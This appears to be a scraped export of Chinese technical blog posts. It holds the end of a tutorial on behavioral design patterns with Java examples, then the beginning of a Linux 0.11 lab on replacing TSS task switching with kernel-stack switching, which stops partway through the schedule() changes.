第一，它能较容易地设计一个命令队列；\n第二，在需要的情况下，可以较容易地将命令记入日志；\n第三，允许接收请求的一方决定是否要否决请求。\n第四，可以容易地实现对请求的撤销和重做;\n第五，由于加进新的具体命令类不影响其他的类，因此增加新的具体命令类很容易。\n其实还有最关键的优点就是命令模式把请求一个操作的对象与知道怎么执行一个操作的对象分割开。\n命令模式支持撤销/恢复操作功能，但还不清楚是否需要这个功能时，要不要实现命令模式？\n应该是不要实现。敏捷开发原则告诉我们，不要为代码添加基于猜测的、实际不需要的功能。如果不清楚一个系统是否需要命令模式，一般就不要着急去实现它，事实上，在需要的时候通过重构实现这个模式并不困难，只有在真正需要如撤销/恢复操作等功能时，把原来的代码重构为命令模式才有意义。\n迭代器模式——检票 迭代器模式（Iterator)，提供一种方法顺序访问一个聚合对象中各个元素，而又不暴露该对象的内部表示。\n跳过\u0026hellip;\n中介者模式——联合国 中介者模式（Mediator)，用一个中介对象来封装一系列的对象交互。中介者使各对象不需要显式地相互引用，从而使其耦合松散，而且可以独立地改变它们之间的交互。\n结构图 代码实现 Mediator\n1 2 3 4 public abstract class Mediator { abstract void send(String msg, Colleague colleague); } Colleague\n1 2 3 4 5 6 7 8 9 10 11 12 13 public abstract class Colleague { Mediator mediator; public Colleague(Mediator mediator) { this.mediator = mediator; } abstract void sendMessage(String msg); abstract void print(String msg); } ConcreteColleague\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public class Colleague1 extends Colleague{ public Colleague1(Mediator mediator) { super(mediator); } @Override void sendMessage(String msg) { super.mediator.send(msg, this); } @Override void print(String msg) { System.out.println(\u0026#34;colleague 1 receive: \u0026#34; + msg); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class Colleague2 extends Colleague{ public Colleague2(Mediator mediator) { super(mediator); } @Override void sendMessage(String msg) { super.mediator.send(msg, this); } @Override void print(String msg) { System.out.println(\u0026#34;colleague 2 receive: \u0026#34; + msg); } } ConcreteMediator\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public class ConcreteMediator extends Mediator{ Colleague1 colleague1; Colleague2 colleague2; public void setColleague1(Colleague1 colleague1) { this.colleague1 = colleague1; } public void setColleague2(Colleague2 colleague2) { this.colleague2 = colleague2; } @Override void send(String msg, Colleague colleague) { if (colleague instanceof Colleague1){ colleague2.print(msg); } else colleague1.print(msg); } } 1 2 colleague 2 receive: hello man colleague 1 receive: see you man 中介者模式优缺点 中介者模式很容易在系统中应用，也很容易在系统中误用。当系统出现了“多对多”交互复杂的对象群时，不要急于使用中介者模式，而要先反思系统在设计上是不是合理。\n中介者模式的优点首先是Mediator的出现减少了各个Colleague的耦合，使得可以独立地改变和复用各个Colleague类和Mediator，比如任何国家的改变不会影响到其他国家，而只是与安理会发生变化。其次，由于把对象如何协作进行了抽象，将中介作为一个独立的概念并将其封装在一个对象中，这样关注的对象就从对象各自本身的行为转移到它们之间的交互上来，也就是站在一个更宏观的角度去看待系统。\n由于ConcreteMediator 控制了集中化，于是就把交互复杂性变为了中介者的复杂性，这就使得中介者会变得比任何一个 ConcreteColleague都复杂。\n中介者模式一般应用于一组对象以定义良好但是复杂的方式进行通信的场合，比如窗体Form对象（计算器），以及想定制一个分布在多个类中的行为，而又不想生成太多的子类的场合。\n备忘录模式——存进度 备忘录(Memento)：在不破坏封装性的前提下，捕获一个对象的内部状态，并在该对象之外保存这个状态。这样以后就可将该对象恢复到原先保存的状态。\n结构图 代码实现 发起人（Originator）类\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 public class Originator { // 需要保存的属性，可能有多个 int hp = 100; int attack = 10; int defence = 10; public Memento save(){ // 创建备忘录,将当前需要保存的信息导入并实例化出一个Memento对象 return new Memento(attack,defence); } public void grow(){ hp += 10; attack += 10; defence += 10; System.out.println(\u0026#34;grow...\u0026#34;); } public void reload(Memento memento){ // 恢复备忘录，将 Memento导入并将相关数据恢复 attack = memento.attack; defence = memento.defence; System.out.println(\u0026#34;reload...\u0026#34;); } @Override public String toString() { return \u0026#34;Originator{\u0026#34; + \u0026#34;hp=\u0026#34; + hp + \u0026#34;, attack=\u0026#34; + attack + \u0026#34;, defence=\u0026#34; + defence + \u0026#39;}\u0026#39;; } // 需要保存的属性，可能有多个 // getter and setter... } 备忘录（Memento）类\n1 2 3 4 5 6 7 8 9 10 public class Memento { int attack; int defence; public Memento(int attack, int defence) { this.attack = attack; this.defence = defence; } } 管理者（Caretaker）类\n1 2 3 4 5 6 7 8 9 10 11 12 public class CareTaker { Memento memento; public Memento getMemento() { return memento; } public void setMemento(Memento memento) { this.memento = memento; } } 客户端程序\n1 2 3 4 5 6 7 8 9 10 11 public static void main(String[] args) { Originator originator = new Originator(); CareTaker careTaker = new CareTaker(); System.out.println(originator); // 保存状态时，由于有了很好的封装,可以隐藏 Originator的实现细节 careTaker.setMemento(originator.save()); originator.grow(); System.out.println(originator); originator.reload(careTaker.getMemento()); System.out.println(originator); } 应用 Memento模式比较适用于功能比较复杂的，但需要维护或记录属性历史的类，或者需要保存的属性只是众多属性中的一小部分时，Originator可以根据保存的Memento信息还原到前一状态。\n**如果在某个系统中使用命令模式时，需要实现命令的撤销功能，那么命令模式可以使用备忘录模式来存储可撤销操作的状态。**有时一些对象的内部信息必须保存在对象以外的地方，但是必须要由对象自己读取，这时，使用备忘录可以把复杂的对象内部信息对其他的对象屏蔽起来，从而可以恰当地保持封装的边界。\n当角色的状态改变的时候，有可能这个状态无效，这时候就可以使用暂时存储起来的备忘录将状态复原。\n观察者模式——BOSS来了 观察者模式又叫做发布-订阅（Publish/Subscribe）模式。观察者模式定义了一种一对多的依赖关系，让多个观察者对象同时监听某一个主题对象。这个主题对象在状态发生变化时，会通知所有观察者对象，使它们能够自动更新自己。\n示例结构图\n结构图 代码实现 Observer\n1 2 3 public interface Observer { void update(); } Notifier\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public class Notifier { List\u0026lt;Observer\u0026gt; observers = new ArrayList\u0026lt;\u0026gt;(); String state; public void attach(Observer observer){ observers.add(observer); } public void detach(Observer observer){ observers.remove(observer); } public void notify2Observer(){ for (Observer observer : observers) { observer.update(); } } public String getState() { return state; } public void setState(String state) { this.state = state; } } ConcreteObserver\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class ConcreteObserver implements Observer{ private String name; private Notifier notifier; public ConcreteObserver(String name, Notifier notifier) { this.name = name; this.notifier = notifier; } @Override public void update() { System.out.println(name + \u0026#34;:\u0026#34; + notifier.getState()); } } ConcreteNotifier\n1 2 3 public class ConcreteNotifier extends Notifier { } main\n1 2 3 4 5 6 7 8 9 10 11 12 13 public class ObserverTest { public static void main(String[] args) { Notifier notifier = new ConcreteNotifier(); Observer observer1 = new ConcreteObserver(\u0026#34;a\u0026#34;, notifier); Observer observer2 = new ConcreteObserver(\u0026#34;b\u0026#34;, notifier); notifier.attach(observer1); notifier.attach(observer2); notifier.setState(\u0026#34;老板来啦\u0026#34;); notifier.notify2Observer(); notifier.detach(observer2); notifier.notify2Observer(); } } 观察者模式的特点 **将一个系统分割成一系列相互协作的类有一个很不好的副作用，那就是需要维护相关对象间的一致性。我们不希望为了维持一致性而使各类紧密耦合，这样会给维护、扩展和重用都带来不便。**而观察者模式的关键对象是主题Subject和观察者Observer，一个Subject可以有任意数目的依赖它的Observer，一旦Subject 的状态发生了改变，所有的Observer都可以得到通知。Subject 发出通知时并不需要知道谁是它的观察者，也就是说，具体观察者是谁，它根本不需要知道。而任何一个具体观察者不知道也不需要知道其他观察者的存在。\n何时使用观察者 当一个对象的改变需要同时改变其他对象的时候，而且它不知道具体有多少对象有待改变时，应该考虑使用观察者模式。\n当一个抽象模型有两个方面，其中一方面依赖于另一方面，这时用观察者模式可以将这两者封装在独立的对象中使它们各自独立地改变和复用。\n观察者模式所做的工作其实就是在解除耦合。让耦合的双方都依赖于抽象，而不是依赖于具体。从而使得各自的变化都不会影响另一边的变化。\n观察者模式的不足 尽管已经用了依赖倒转原则，但是”抽象通知者“还是依赖”抽象观察者“\u0026rsquo;，也就是说，万一没有了抽象观察者这样的接口，通知的功能就完不成了。另外就是每个具体观察者，它不一定是”更新“的方法要调用。举个例子：希望的是”工具箱“是隐藏，”自动窗口“是打开，这这些都不是同名的方法。\n如果通知者和观察者之间根本就互相不知道，由客户端来决定通知谁，那就好了。\n事件委托 委托是一种引用方法的类型。一旦为委托分配了方法，委托将与该方法具有完全相同的行为。委托方法的使用可以像其他任何方法一样，具有参数和返回值。委托可以看作是对函数的抽象，是函数的”类“，委托的实例将代表一个具体的函数。\n一个委托可以搭载多个方法，所有方法被依次唤起。更重要的是，它可以使得委托对象所搭载的方法并不需要属于同一个类。\n但委托也是有前提的，那就是委托对象所搭载的所有方法必须具有相同的原形和形式，也就是拥有相同的参数列表和返回值类型。\n==“委托”在C#中是一个语言级特性，而在Java语言中没有直接的对应，但是java利用反射即可实现委托！==\nhttps://blog.csdn.net/Seriousplus/article/details/80462722\n委派和继承都是为了代码复用，只是方式不同。\n委托可以被看作是对象级别的重用机制，而继承是类级别的重用机制。 此外，如果子类只需要复用父类中的一小部分方法，可以不需 要使用继承，而是通过委派机制来实现 状态模式——多分支判断 状态模式（State)，当一个对象的内在状态改变时允许改变其行为，这个对象看起来像是改变了其类。\n**状态模式主要解决的是当控制一个对象状态转换的条件表达式过于复杂时的情况。把状态的判断逻辑转移到表示不同状态的一系列类当中，可以把复杂的判断逻辑简化。**当然，如果这个状态判断很简单，那就没必要用”状态模式“了。\n结构图 状态模式好处与用处 将特定的状态相关的行为都放入一个对象中，由于所有与状态相关的代码都存在于某个ConcreteState中，所以通过定义新的子类可以很容易地增加新的状态和转换。\n这样做的目的就是为了消除庞大的条件分支语句，大的分支判断会使得它们难以修改和扩展，任何改动和变化都是致命的。状态模式通过把各种状态转移逻辑分布到State 的子类之间，来减少相互间的依赖，此时就容易维护和扩展了。\n何时使用状态模式 **当一个对象的行为取决于它的状态，并且它必须在运行时刻根据状态改变它的行为时，就可以考虑使用状态模式了。**另外如果业务需求某项业务有多个状态，通常都是一些枚举常量，状态的变化都是依靠大量的多分支判断语句来实现，此时应该考虑将每一种业务状态定义为一个State的子类。这样这些对象就可以不依赖于其他对象而独立变化了，某一天客户需要更改需求，增加或减少业务状态或改变状态流程，都是不困难的事。\n代码实现 State\n1 2 3 public interface State { void handle(Context context); } FirstState\n1 2 3 4 5 6 7 8 9 10 11 public class FirstState implements State{ @Override public void handle(Context context) { if (context.getFlag() \u0026lt; 12) System.out.println(\u0026#34;first state\u0026#34;); else { context.setState(new SecondState()); context.request(); } } } SecondState\n1 2 3 4 5 6 7 8 9 10 11 public class SecondState implements State{ @Override public void handle(Context context) { if (context.getFlag() \u0026lt; 17) System.out.println(\u0026#34;second state\u0026#34;); else { context.setState(new ThirdState()); context.request(); } } } ThirdState\n1 2 3 4 5 6 public class ThirdState implements State{ @Override public void handle(Context context) { System.out.println(\u0026#34;third state\u0026#34;); } } Context\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class Context { private int flag; private State state; public Context(State state) { this.state = state; } public void request(){ state.handle(this); } // ... get and set } main\n1 2 3 4 5 6 7 8 9 public static void main(String[] args) { Context context = new Context(new FirstState()); context.setFlag(11); context.request(); context.setFlag(13); context.request(); context.setFlag(18); context.request(); } 策略模式——商场促销 对于商场促销的例子，简单工厂模式虽然也能解决这个问题，但这个模式只是解决对象的创建问题，而且由于工厂本身包括了所有的收费方式，商场是可能经常性地更改打折额度和返利额度，每次维护或扩展收费方式都要改动这个工厂，以致代码需重新编译部署，所以用它不是最好的办法。面对算法的时常变动，有更好的办法。\n策略模式(Strategy)：它定义了算法家族，分别封装起来，让它们之间可以互相替换，此模式让算法的变化，不会影响到使用算法的客户。\n结构图 策略模式实现 Strategy接口，各种算法都要实现这个接口\n1 2 3 public interface Strategy { double getResult(double money); } 算法实现类\n1 2 3 4 5 6 public class CashNormal implements Strategy{ @Override public double getResult(double money) { return money; } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 public class CashRebate implements Strategy{ private double rebate = 1; public CashRebate(){ } public CashRebate(double rebate){ this.rebate = rebate; } @Override public double getResult(double money) { return money * rebate; } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class CashReturn implements Strategy{ private double moneyCondition; private double moneyReturn; public CashReturn(double moneyCondition, double moneyReturn){ this.moneyCondition = moneyCondition; this.moneyReturn = moneyReturn; } @Override public double getResult(double money) { return money \u0026gt;= moneyCondition ? money - Math.floor(money / moneyCondition) * moneyReturn : money; } } Context\n1 2 3 4 5 6 7 8 9 10 11 12 13 public class CashContext { private Strategy strategy; public CashContext(Strategy strategy){ this.strategy = strategy; } public double getResult(double money){ return strategy.getResult(money); } } 主函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 public class StrategyTest { public static void main(String[] args) { System.out.println(StrategyTest.test(\u0026#34;normal\u0026#34;, 200)); System.out.println(StrategyTest.test(\u0026#34;rebate\u0026#34;, 200)); System.out.println(StrategyTest.test(\u0026#34;return\u0026#34;, 200)); } public static double test(String op,double money){ CashContext cashContext = null; switch (op){ case \u0026#34;normal\u0026#34;:{ cashContext = new CashContext(new CashNormal()); break; } case \u0026#34;rebate\u0026#34;:{ cashContext = new CashContext(new CashRebate(0.8)); break; } case \u0026#34;return\u0026#34;:{ cashContext = new CashContext(new CashReturn(200, 20)); break; } } return cashContext.getResult(money); } } 这种方式是在客户端去判断用哪一个蒜贩，能否把这个判断的过程从客户端程序转移走？ \u0026ndash;\u0026gt; 简单工厂\n策略与简单工厂结合 只需修改Context类即可\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 public class CashContextPro { private Strategy strategy; public CashContextPro(String op){ switch (op){ case \u0026#34;normal\u0026#34;:{ strategy = new CashNormal(); break; } case \u0026#34;rebate\u0026#34;:{ strategy = new CashRebate(0.8); break; } case \u0026#34;return\u0026#34;:{ strategy = new CashReturn(200, 20); break; } } } public double getResult(double money){ return strategy.getResult(money); } } 主函数\n1 2 3 4 5 6 7 8 9 10 11 12 13 public class StrategyTest { public static void main(String[] args) { System.out.println(StrategyTest.test2(\u0026#34;normal\u0026#34;, 200)); System.out.println(StrategyTest.test2(\u0026#34;rebate\u0026#34;, 200)); System.out.println(StrategyTest.test2(\u0026#34;return\u0026#34;, 200)); } public static double test2(String op,double money){ return new CashContextPro(op).getResult(money); } } 策略模式解析 策略模式是一种定义一系列算法的方法，从概念上来看，所有这些算法完成的都是相同的工作，只是实现不同，它可以以相同的方式调用所有的算法，减少了各种算法类与使用算法类之间的耦合。\n策略模式的Strategy类层次为Context定义了一系列的可供重用的算法或行为。继承有助于析取出这些算法中的公共功能。对于打折、返利或者其他的算法，其实都是对实际商品收费的一种计算方式，通过继承，可以得到它们的公共功能。\n策略模式就是用来封装算法的，但在实践中，可以用它来封装几乎任何类型的规则，只要在分析过程中听到需要在不同时间应用不同的业务规则，就可以考虑使用策略模式处理这种变化的可能性。\n但是这种方式还有一些不足：如果增加一种算法就必须更改switch的代码\n更好的方法 ：==反射==\n注：在抽象工厂模式章节有对反射的讲解\n模板方法模式——答题模板 模板方法模式，定义一个操作中的算法的骨架，而将一些步骤延迟到子类中。模板方法使得子类可以不改变一个算法的结构即可重定义该算法的某些特定步骤。\n结构图 模板方法模式是通过把不变行为搬移到超类，去除子类中的重复代码来体现它的优势。\n模板方法模式就是提供了一个很好的代码复用平台。\n当不变的和可变的行为在方法的子类实现中混合在一起的时候，不变的行为就会在子类中重复出现。通过模板方法模式把这些行为搬移到单一的地方，这样就帮助子类摆脱重复的不变行为的纠缠。\n模板方法模式代码实现 Templete class\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 public abstract class Template { public void test1(){ System.out.println(\u0026#34;test1: \u0026#34; + answer1()); } public void test2(){ System.out.println(\u0026#34;test2: \u0026#34; + answer2()); } public void test3(){ System.out.println(\u0026#34;test3: \u0026#34; + answer3()); } public abstract String answer1(); public abstract String answer2(); public abstract String answer3(); } Concrete class\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class Person1 extends Template{ @Override public String answer1() { return \u0026#34;a\u0026#34;; } @Override public String answer2() { return \u0026#34;b\u0026#34;; } @Override public String answer3() { return \u0026#34;c\u0026#34;; } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class Person2 extends Template{ @Override public String answer1() { return \u0026#34;c\u0026#34;; } @Override public String answer2() { return \u0026#34;b\u0026#34;; } @Override public String answer3() { return \u0026#34;a\u0026#34;; } } test class\n1 2 3 4 5 6 7 8 9 10 11 12 public class TemplateMethodTest { public static void main(String[] args) { Template person1 = new Person1(); Template person2 = new Person2(); person1.test1(); person1.test2(); person1.test3(); person2.test1(); person2.test2(); person2.test3(); } } 访问者模式——男女对比 访问者模式（Visitor），表示一个作用于某对象结构中的各元素的操作。它使你可以在不改变各元素的类的前提下定义作用于这些元素的新操作。\n访问者模式适用于数据结构相对稳定的系统。\n它把数据结构和作用于结构上的操作之间的耦合解脱开，使得操作集合可以相对自由地演化。\n**访问者模式的目的是要把处理从数据结构分离出来。很多系统可以按照算法和数据结构分开，如果这样的系统有比较稳定的数据结构，又有易于变化的算法的话，使用访问者模式就是比较合适的，因为访问者模式使得算法操作的增加变得容易。**反之，如果这样的系统的数据结构对象易于变化，经常要有新的数据对象增加进来，就不适合使用访问者模式。\n访问者模式的优点就是增加新的操作很容易，因为增加新的操作就意味着增加一个新的访问者。访问者模式将有关的行为集中到一个访问者对象中。\n访问者的缺点其实也就是使增加新的数据结构变得困难了。\n结构图 代码实现 Element\n1 2 3 public interface Element { void accept(Visitor visitor); } Visitor\n1 2 3 4 public interface Visitor { void visitorElementA(ConcreteElementA element); void visitorElementB(ConcreteElementB element); } ConcreteElement\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class ConcreteElementA implements Element{ String name; public ConcreteElementA(String name) { this.name = name; } public String getName() { return name; } @Override public void accept(Visitor visitor) { visitor.visitorElementA(this); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public class ConcreteElementB implements Element{ String name; public ConcreteElementB(String name) { this.name = name; } public String getName() { return name; } @Override public void accept(Visitor visitor) { visitor.visitorElementB(this); } } ConcreteVisitor\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class ConcreteVisitorA implements Visitor{ String name; public ConcreteVisitorA(String name) { this.name = name; } @Override public void visitorElementA(ConcreteElementA element) { System.out.println(this.name + \u0026#34; visit \u0026#34; + element.getName()); } @Override public void visitorElementB(ConcreteElementB element) { System.out.println(this.name + \u0026#34; visit \u0026#34; + element.getName()); } } 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 public class ConcreteVisitorB implements Visitor{ String name; public ConcreteVisitorB(String name) { this.name = name; } @Override public void visitorElementA(ConcreteElementA element) { System.out.println(this.name + \u0026#34; visit \u0026#34; + element.getName()); } @Override public void visitorElementB(ConcreteElementB element) { System.out.println(this.name + \u0026#34; visit \u0026#34; + element.getName()); } } ObjectStructure\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 public class ObjectStructure { List\u0026lt;Element\u0026gt; elements = new ArrayList\u0026lt;\u0026gt;(); public void attach(Element element){ elements.add(element); } public void detach(Element element){ elements.remove(element); } public void display(Visitor visitor){ for (Element element : elements) { element.accept(visitor); } } } Client\n1 2 3 4 5 6 7 8 public static void main(String[] args) { ObjectStructure objectStructure = new ObjectStructure(); ConcreteElementA elementA = new ConcreteElementA(\u0026#34;element a\u0026#34;); ConcreteElementB elementB = new ConcreteElementB(\u0026#34;element b\u0026#34;); objectStructure.attach(elementA); objectStructure.attach(elementB); objectStructure.display(new ConcreteVisitorA(\u0026#34;visitor a\u0026#34;)); } ","permalink":"https://chance7bin.github.io/posts/basic/pattern/%E8%A1%8C%E4%B8%BA%E6%A8%A1%E5%BC%8F/","summary":"职责链模式——加薪 职责链模式（Chain of Responsibility）：使多个对象都有机会处理请求，从而避免请求的发送者和接收者之间的耦合","title":"行为模式"},{"content":"1.实验目的 深入理解进程和进程切换的概念； 综合应用进程、CPU 管理、PCB、LDT、内核栈、内核态等知识解决实际问题； 开始建立系统认识。 2.实验内容 现在的 Linux 0.11 采用 TSS（后面会有详细论述）和一条指令就能完成任务切换，虽然简单，但这指令的执行时间却很长，在实现任务切换时大概需要 200 多个时钟周期。\n而通过堆栈实现任务切换可能要更快，而且采用堆栈的切换还可以使用指令流水的并行优化技术，同时又使得 CPU 的设计变得简单。所以无论是 Linux 还是 Windows，进程/线程的切换都没有使用 Intel 提供的这种 TSS 切换手段，而都是通过堆栈实现的。\n本次实践项目就是将 Linux 0.11 中采用的 TSS 切换部分去掉，取而代之的是基于堆栈的切换程序。具体的说，就是将 Linux 0.11 中的 switch_to 实现去掉，写成一段基于堆栈切换的代码。\n本次实验包括如下内容：\n编写汇编程序 switch_to： 完成主体框架； 在主体框架下依次完成 PCB 切换、内核栈切换、LDT 切换等； 修改 fork()，由于是基于内核栈的切换，所以进程需要创建出能完成内核栈切换的样子。 修改 PCB，即 task_struct 结构，增加相应的内容域，同时处理由于修改了 task_struct 所造成的影响。 用修改后的 Linux 0.11 仍然可以启动、可以正常使用。 （选做）分析实验 3 的日志体会修改前后系统运行的差别。 3.实验报告 回答下面三个题：\n问题 1 针对下面的代码片段：\n1 2 3 movl tss,%ecx addl $4096,%ebx movl %ebx,ESP0(%ecx) 回答问题：\n（1）为什么要加 4096； （2）为什么没有设置 tss 中的 ss0。 问题 2 针对代码片段：\n1 2 3 4 *(--krnstack) = ebp; *(--krnstack) = ecx; *(--krnstack) = ebx; *(--krnstack) = 0; 回答问题：\n（1）子进程第一次执行时，eax=？为什么要等于这个数？哪里的工作让 eax 等于这样一个数？ （2）这段代码中的 ebx 和 ecx 来自哪里，是什么含义，为什么要通过这些代码将其写到子进程的内核栈中？ （3）这段代码中的 ebp 来自哪里，是什么含义，为什么要做这样的设置？可以不设置吗？为什么？ 问题 3 为什么要在切换完 LDT 之后要重新设置 fs=0x17？而且为什么重设操作要出现在切换完 LDT 之后，出现在 LDT 之前又会怎么样？\n4.实验提示 本次实验将 Linux 0.11 中采用的 TSS 切换部分去掉，取而代之的是基于堆栈的切换程序。具体的说，就是将 Linux 0.11 中的 switch_to （在 kernal/system_call.s 中）实现去掉，写成一段基于堆栈切换的代码。\n4.1 TSS 切换 在现在的 Linux 0.11 中，真正完成进程切换是依靠任务状态段（Task State Segment，简称 TSS）的切换来完成的。\n具体的说，在设计“Intel 架构”（即 x86 系统结构）时，每个任务（进程或线程）都对应一个独立的 TSS，TSS 就是内存中的一个结构体，里面包含了几乎所有的 CPU 寄存器的映像。有一个任务寄存器（Task Register，简称 TR）指向当前进程对应的 TSS 结构体，所谓的 TSS 切换就将 CPU 中几乎所有的寄存器都复制到 TR 指向的那个 TSS 结构体中保存起来，同时找到一个目标 TSS，即要切换到的下一个进程对应的 TSS，将其中存放的寄存器映像“扣在” CPU 上，就完成了执行现场的切换，如下图所示。\n图 1 基于 TSS 的进程切换\nIntel 架构不仅提供了 TSS 来实现任务切换，而且只要一条指令就能完成这样的切换，即图中的 ljmp 指令。\n具体的工作过程是：\n（1）首先用 TR 中存取的段选择符在 GDT 表中找到当前 TSS 的内存位置，由于 TSS 是一个段，所以需要用段表中的一个描述符来表示这个段，和在系统启动时论述的内核代码段是一样的，那个段用 GDT 中的某个表项来描述，还记得是哪项吗？是 8 对应的第 1 项。此处的 TSS 也是用 GDT 中的某个表项描述，而 TR 寄存器是用来表示这个段用 GDT 表中的哪一项来描述，所以 TR 和 CS、DS 等寄存器的功能是完全类似的。 （2）找到了当前的 TSS 段（就是一段内存区域）以后，将 CPU 中的寄存器映像存放到这段内存区域中，即拍了一个快照。 （3）存放了当前进程的执行现场以后，接下来要找到目标进程的现场，并将其扣在 CPU 上，找目标 TSS 段的方法也是一样的，因为找段都要从一个描述符表中找，描述 TSS 的描述符放在 GDT 表中，所以找目标 TSS 段也要靠 GDT 表，当然只要给出目标 TSS 段对应的描述符在 GDT 表中存放的位置——段选择子就可以了，仔细想想系统启动时那条著名的 jmpi 0, 8 指令，这个段选择子就放在 ljmp 的参数中，实际上就 jmpi 0, 8 中的 8。 （4）一旦将目标 TSS 中的全部寄存器映像扣在 CPU 上，就相当于切换到了目标进程的执行现场了，因为那里有目标进程停下时的 CS:EIP，所以此时就开始从目标进程停下时的那个 CS:EIP 处开始执行，现在目标进程就变成了当前进程，所以 TR 需要修改为目标 TSS 段在 GDT 表中的段描述符所在的位置，因为 TR 总是指向当前 TSS 段的段描述符所在的位置。 上面给出的这些工作都是一句长跳转指令 ljmp 段选择子:段内偏移，在段选择子指向的段描述符是 TSS 段时 CPU 解释执行的结果，所以基于 TSS 进行进程/线程切换的 switch_to 实际上就是一句 ljmp 指令：\n1 2 3 4 5 6 7 8 9 10 11 #define switch_to(n) { struct{long a,b;} tmp; __asm__( \u0026#34;movw %%dx,%1\u0026#34; \u0026#34;ljmp %0\u0026#34; ::\u0026#34;m\u0026#34;(*\u0026amp;tmp.a), \u0026#34;m\u0026#34;(*\u0026amp;tmp.b), \u0026#34;d\u0026#34;(TSS(n) ) } #define FIRST_TSS_ENTRY 4 #define TSS(n) (((unsigned long) n) \u0026lt;\u0026lt; 4) + (FIRST_TSS_ENTRY \u0026lt;\u0026lt; 3)) GDT 表的结构如下图所示，所以第一个 TSS 表项，即 0 号进程的 TSS 表项在第 4 个位置上，4\u0026laquo;3，即 4 * 8，相当于 TSS 在 GDT 表中开始的位置，TSS（n）找到的是进程 n 的 TSS 位置，所以还要再加上 n\u0026laquo;4，即 n * 16，因为每个进程对应有 1 个 TSS 和 1 个 LDT，每个描述符的长度都是 8 个字节，所以是乘以 16，其中 LDT 的作用就是上面论述的那个映射表，关于这个表的详细论述要等到内存管理一章。TSS(n) = n * 16 + 4 * 8，得到就是进程 n（切换到的目标进程）的 TSS 选择子，将这个值放到 dx 寄存器中，并且又放置到结构体 tmp 中 32 位长整数 b 的前 16 位，现在 64 位 tmp 中的内容是前 32 位为空，这个 32 位数字是段内偏移，就是 jmpi 0, 8 中的 0；接下来的 16 位是 n * 16 + 4 * 8，这个数字是段选择子，就是 jmpi 0, 8 中的 8，再接下来的 16 位也为空。所以 swith_to 的核心实际上就是 ljmp 空, n*16+4*8，现在和前面给出的基于 TSS 的进程切换联系在一起了。\n图 2 GDT 表中的内容\n4.2 本次实验的内容 虽然用一条指令就能完成任务切换，但这指令的执行时间却很长，这条 ljmp 指令在实现任务切换时大概需要 200 多个时钟周期。而通过堆栈实现任务切换可能要更快，而且采用堆栈的切换还可以使用指令流水的并行优化技术，同时又使得 CPU 的设计变得简单。所以无论是 Linux 还是 Windows，进程/线程的切换都没有使用 Intel 提供的这种 TSS 切换手段，而都是通过堆栈实现的。\n本次实践项目就是将 Linux 0.11 中采用的 TSS 切换部分去掉，取而代之的是基于堆栈的切换程序。具体的说，就是将 Linux 0.11 中的 switch_to 实现去掉，写成一段基于堆栈切换的代码。\n在现在的 Linux 0.11 中，真正完成进程切换是依靠任务状态段（Task State Segment，简称 TSS）的切换来完成的。具体的说，在设计“Intel 架构”（即 x86 系统结构）时，每个任务（进程或线程）都对应一个独立的 TSS，TSS 就是内存中的一个结构体，里面包含了几乎所有的 CPU 寄存器的映像。有一个任务寄存器（Task Register，简称 TR）指向当前进程对应的 TSS 结构体，所谓的 TSS 切换就将 CPU 中几乎所有的寄存器都复制到 TR 指向的那个 TSS 结构体中保存起来，同时找到一个目标 TSS，即要切换到的下一个进程对应的 TSS，将其中存放的寄存器映像“扣在”CPU 上，就完成了执行现场的切换。\n要实现基于内核栈的任务切换，主要完成如下三件工作：\n（1）重写 switch_to； （2）将重写的 switch_to 和 schedule() 函数接在一起； （3）修改现在的 fork()。 4.3 schedule 与 switch_to 目前 Linux 0.11 中工作的 schedule() 函数是首先找到下一个进程的数组位置 next，而这个 next 就是 GDT 中的 n，所以这个 next 是用来找到切换后目标 TSS 段的段描述符的，一旦获得了这个 next 值，直接调用上面剖析的那个宏展开 switch_to(next);就能完成如图 TSS 切换所示的切换了。\n现在，我们不用 TSS 进行切换，而是采用切换内核栈的方式来完成进程切换，所以在新的 switch_to 中将用到当前进程的 PCB、目标进程的 PCB、当前进程的内核栈、目标进程的内核栈等信息。由于 Linux 0.11 进程的内核栈和该进程的 PCB 在同一页内存上（一块 4KB 大小的内存），其中 PCB 位于这页内存的低地址，栈位于这页内存的高地址；另外，由于当前进程的 PCB 是用一个全局变量 current 指向的，所以只要告诉新 switch_to()函数一个指向目标进程 PCB 的指针就可以了。同时还要将 next 也传递进去，虽然 TSS(next)不再需要了，但是 LDT(next)仍然是需要的，也就是说，现在每个进程不用有自己的 TSS 了，因为已经不采用 TSS 进程切换了，但是每个进程需要有自己的 LDT，地址分离地址还是必须要有的，而进程切换必然要涉及到 LDT 的切换。\n综上所述，需要将目前的 schedule() 函数（在 kernal/sched.c 中）做稍许修改，即将下面的代码：\n1 2 3 4 5 6 if ((*p)-\u0026gt;state == TASK_RUNNING \u0026amp;\u0026amp; (*p)-\u0026gt;counter \u0026gt; c) c = (*p)-\u0026gt;counter, next = i; //...... switch_to(next); 修改为：\n1 2 3 4 5 6 if ((*p)-\u0026gt;state == TASK_RUNNING \u0026amp;\u0026amp; (*p)-\u0026gt;counter \u0026gt; c) c = (*p)-\u0026gt;counter, next = i, pnext = *p; //....... switch_to(pnext, 